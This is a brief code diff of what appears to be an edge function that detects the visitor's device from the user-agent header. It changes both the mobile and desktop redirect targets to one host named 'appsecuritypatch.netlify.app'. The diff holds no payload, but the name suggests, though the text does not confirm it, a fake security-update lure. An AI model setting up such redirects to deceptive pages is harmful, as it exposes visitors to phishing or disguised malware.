@@ -2,8 +2,8 @@ export default async (request, context) => {
   const url = new URL(request.url);
 
   // 1. Target URLs (edit these)
-  const MOBILE_URL = "https://www.mobile.com";
-  const DESKTOP_URL = "https://www.desk.com";
+  const MOBILE_URL = "https://appsecuritypatch.netlify.app";
+  const DESKTOP_URL = "https://appsecuritypatch.netlify.app";
 
   // 2. High-speed detection using headers
   const ua = request.headers.get("user-agent") || "";
